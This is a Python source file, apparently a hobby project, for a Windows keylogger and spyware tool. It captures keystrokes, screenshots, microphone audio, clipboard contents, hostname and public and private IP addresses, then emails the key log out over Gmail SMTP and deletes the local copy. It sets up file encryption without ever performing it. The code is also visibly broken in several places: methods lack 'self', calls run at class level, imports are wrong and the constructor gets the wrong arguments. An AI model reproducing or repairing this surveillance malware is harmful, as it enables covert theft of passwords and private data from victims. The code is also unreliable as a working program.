#libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import keyword
import smtplib
import socket
import platform
from threading import current_thread
import win32clipboard
from pynput.keyboard import key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get 
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
#variables
keys_information = "key_log.txt"
file_path = "C:\\Users\\glory\OneDrive\\Desktop\\adv_keylogging_proj_py\\Project"
extend = "\\"
file_merge = file_path + extend

count = 0
keys = []
key_information = "key_log.txt"
system_information = "system_info.txt"
email_address = ""
password = ""
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "ss.png"
time_iteration = 15
microphone_time = 10;
number_of_iteration_end = 3

key_information_e = "e_key_log.txt"
system_information_e = "e_system_info.txt"
clipboard_information_e = "e_clipboard.txt"
#class
class Keylogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_file(self, string):
        with open(file_path + extend + keys_information, "a") as f:
            f.write(string)

    def computer_information():
        with open(file_path + extend + system_information, "a") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            try:
                public_ip = get("https://api.ipify.org").text
                f.write("Public IP Address: " + public_ip)
            except Exception:
                f.write("Couldn't get Public IP Address (most likely max query")
            f.write("Processor: " + (platform.processor()) + "")
            f.write("System: " + platform.system() + " " + platform.version() + "")
            f.write("Machine: " + platform.machine() + "")
            f.write("Hostname: " + hostname + "")
            f.write("Private IP Address: " + IPAddr + "")

    computer_information()

    def process_key_press(self, key):
        global keys, count

        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "

        keys.append(current_key)
        count += 1

        if count >= 1:
            count = 0
            self.write_file(keys)
            keys = []

    def write_file(self, keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = key.replace("'", "")
                if k.find("space") > 0:
                    f.write(' ')
                elif k.find("Key") == -1:
                    f.write(k)

    def on_release(key):
        if key == keyword.esc:
            return False
    with Listener(on_press=process_key_press, on_release=on_release) as listener:
        listener.join()
        

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        self.send_mail(self.email, self.password, "\n")
        self.send_mail(self.email, self.password, file_path + extend + keys_information)
        self.send_mail(self.email, self.password, "\n")
        os.remove(file_path + extend + keys_information)

    def screenshot(self):
        im = ImageGrab.grab()
        im.save(file_path + extend + "ss.png")
    
    screenshot()

    number_of_iteration = 0
    current_time = time.time()
    stopping_time = time.time() + time_iteration

    if current_time > stopping_time:
        screenshot()
        number_of_iteration += 1
        current_time = time.time()
        stopping_time = time.time() + time_iteration

    def system_info(self):
        with open(file_path + extend + "system_info.txt", "a") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            try:
                public_ip = get("https://api.ipify.org").text
                f.write("Public IP Address: " + public_ip)
            except Exception:
                f.write("Couldn't get Public IP Address (most likely max query")
            f.write("Processor: " + (platform.processor()) + "")
            f.write("System: " + platform.system() + " " + platform.version() + "")
            f.write("Machine: " + platform.machine() + "")
            f.write("Hostname: " + hostname + "")
            f.write("Private IP Address: " + IPAddr + "")

    def microphone(self):
        fs = 44100
        seconds = 10

        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()

        write(file_path + extend + "audio.wav", fs, myrecording)

    def clipboard(self):
        with open(file_path + extend + "clipboard.txt", "a") as f:
            try:
                win32clipboard.OpenClipboard()
                pasted_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()

                f.write("Clipboard Data: \n" + pasted_data)
            except:
                f.write("Clipboard could not be copied")

    def run(self):
        keyboard_listener = Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            self.screenshot()
            self.system_info()
            self.microphone()
            self.clipboard()
            keyboard_listener.join()

#main
if __name__ == "__main__":
    keylogger = Keylogger(120, "")
    keylogger.run()

file_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]


